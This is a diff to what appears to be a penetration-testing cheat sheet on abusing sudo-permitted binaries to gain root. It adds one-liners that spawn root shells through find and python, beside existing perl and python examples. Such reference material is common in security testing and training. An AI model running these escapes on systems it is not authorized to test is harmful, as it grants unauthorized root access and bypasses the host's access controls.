@@ -202,9 +202,12 @@ User www-data may run the following commands on <hostname>
 
 Absuing Sudo binaries to gain root
 ----------------------------------------------------
-find
+Find
 ```
 sudo find / etc/passwd -exec /bin/bash \;
+```
+```
+sudo find /home -exec /bin/bash \;
 ```
 
 Nmap
@@ -239,6 +242,9 @@ sudo perl -e 'exec "/bin/bash";'
 Python
 ```
 sudo python -c 'import pty;pty.spawn("/bin/bash")'
+```
+```
+sudo python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
 Less
